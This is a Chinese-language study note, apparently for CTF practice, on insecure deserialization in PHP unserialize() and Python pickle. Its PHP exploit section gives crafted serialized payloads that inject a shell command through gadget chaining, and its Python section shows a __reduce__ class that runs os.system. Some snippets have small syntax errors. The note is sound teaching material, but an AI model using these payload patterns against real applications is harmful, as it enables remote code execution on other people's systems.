# Unserialization
多個語言都有反序列化的漏洞問題，記住基本觀念：**序列化：物件轉換成字串/反序列化：字串轉換成物件**。  
*  [PHP Unserialization](#php-unserialization)  
   *  [Serialization vs Unserialization](#serialization-vs-unserialization)  
   *  [Magic Function](#magic-function)  
   *  [Exploit](#exploit)    
   *  [Reference](#reference)  
*  [Python Unserialization](#python-unserialization)  
   *  [Magic Function](#magic-function)  
   *  [Exploit](#exploit)  
   *  [Reference](#reference)
   

# PHP Unserialization
Cookie 和 session中常會用到。如果傳入unserialize()的參數會可控的話，將可以透過精心製造的payload去覆蓋一些已有的變量甚至控制程式流程。  

## Serialization vs Unserialization
簡單的來說：  
```serialize()```: 讓物件變成易於傳輸或儲存的值或字串  
```unserialize()```: 上述過程的逆向反應  
```php
class pwnch(){
  $test = "helloworld";
  function __wakeup(){
      echo "hello again";
  }
}
echo serialize(new pwnch());   // OUTPUT: O:5:"pwnch":1:{s:4:"test";s:10:"helloworld";} 
```
OUTPUT: ```O``` 代表物件, ```5``` 是物件名的長度. ```1``` 是屬性大小, ```4``` 是變數名稱的長度, 後面整體的屬性構成是```key:value```.  

型態 | 語法  
------------ | -------------  
String | ```s:size:value;```  
Integer | ```i:value;```  
Boolean | ```b:value;```  
NULL | ```N;```  
Array | ```a:size:{key-type:key-value;value-type:value-value;}```  
Object | ```O:strlen(Object):class-name:object size:```  
------------ | -------------  
public | ```{s:4:"test"}```  
private | ```{s:11:"%00pwnch%00test"}```  
protected | ```{s:7:"%00*%00test"}```  

## Magic Function
* ```construct()```: new一個物件時會自動調用，但是unserialize()不會調用
* ```destruct()```: 銷毀物件時自動調用，unserialize也會調用  
* ```__sleep()```: serialize會優先執行sleep()  
* ```__wakeup()```: unserialize會優先執行wakeup()  

## Exploit
統整一下payload
```php
unserialize($_GET[1]);

1 = O:5:"pwnch":1:{s:4:"test";s:length of your code:"code you want to insert";}

// 這邊可以覆蓋變量，記得要連同修改你自己塞入的payload長度  


// 那有滿滿的wakeup和destruct給你調用！
// 自己找有用的gadget把它串起來  

1 = O:5:"pwnch":1:{s:4:"test";O:6:"pwnch2":1{s:5:"test2";s:10:"echo `ls`;";}}

// 上例中我強行將test中的constructor覆蓋成pwnch2，再進而覆蓋pwnch2裡的變量：因為pwnch2裡有我想要用的function

// 本有想要在反序列化裡試試延伸數組的特性來建造php後門
// 構造了很久都沒有成功
```
Tools:  
* [php在线反序列化工具](https://1024tools.com/unserialize)

## Reference
1. [chybeta's blog](https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)  

# Python unserialization
[關於模塊的細節我相當推這篇文章](https://www.jianshu.com/p/5f936abf31f7?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation)  
Python中的**pickle**和**cPickle**都可以實現序列化  
1. ```cPickle.dumps```: obj -> str  
2. ```cPickle.loads```: str -> obj  
另外還可以使用dump/load，這裏就不做討論囉  
python反序列化漏洞比php更嚴重，原因在於可以透過模塊造成RCE！  

## Magic Function
```reduce```時會完全改變被反序列化的對象，因此對象為可控的
```python
// magic function: reduce
import cPickle
import os

class People(object):

    def __init__(self,username,password):
        self.username = username
        self.password = password
        
    def __reduce__(self):
        return (os.system, ('ls',))
        
michael = People('admin','password')
print cPickle.loads(cPickle.dumps(michael))
// Output: ls (the result of ls
```  
要觸發反序列化漏洞我們當然要使用```cPickle.loads```，他接受的參數為str型態，因此我們不能使用```cPickle.loads(michael)```，我這邊就先用dumps把它換成字串。  

## Exploit
CTF裡面常常會與web結合，像是利用```<?php system("echo $data | python vul.py")?>```。```vul.py```中可能有個IO在接，我得把data塞入字串化後帶有**magic function**的物件。  

## Reference
1. [Python反序列化小记](https://www.jianshu.com/p/061d2c594d97)  
2. [序列化和反序列化模块pickle介绍 | Python库](https://www.jianshu.com/p/5f936abf31f7?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation)
